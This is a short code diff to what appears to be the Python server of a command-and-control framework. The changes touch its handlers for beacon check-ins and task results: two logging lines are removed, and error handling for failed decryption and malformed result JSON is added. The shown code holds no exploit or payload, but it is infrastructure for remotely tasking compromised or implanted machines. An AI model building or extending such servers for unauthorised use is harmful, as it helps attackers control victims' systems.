@@ -94,14 +94,12 @@ async def handle_checkin(request: web.Request) -> web.Response:
        If POST, body contains encrypted telemetry JSON."""
     try:
         beacon_id = request.headers.get("X-Beacon-Id")
-        logger.info(f"Received check-in from {request.remote}. Headers: {dict(request.headers)}")
         if not beacon_id:
             logger.warning(f"Checkin attempt without Beacon ID from {request.remote}")
             return web.Response(status=400)
 
         info = {"ip": request.remote, "last_seen": datetime.now().isoformat(timespec="seconds")}
         c2_state.update_beacon(beacon_id, info)
-        logger.info(f"Beacon updated: {beacon_id}")
 
         if request.method == "POST" and request.can_read_body:
             encrypted_body = await request.text()
@@ -155,9 +153,15 @@ async def handle_result(request: web.Request) -> web.Response:
         decrypted_body = decrypt_data(encrypted_body)
 
         if not decrypted_body:
+            logger.warning(f"Result decryption failed from beacon {beacon_id}")
             return web.Response(status=400)
 
-        data = json.loads(decrypted_body)
+        try:
+            data = json.loads(decrypted_body)
+        except json.JSONDecodeError as e:
+            logger.error(f"Failed to parse result JSON from {beacon_id}. Body: {decrypted_body[:100]}... Error: {e}")
+            return web.Response(status=400)
+            
         task_id = data.get("task_id", "unknown")
         output = data.get("output", "")
 
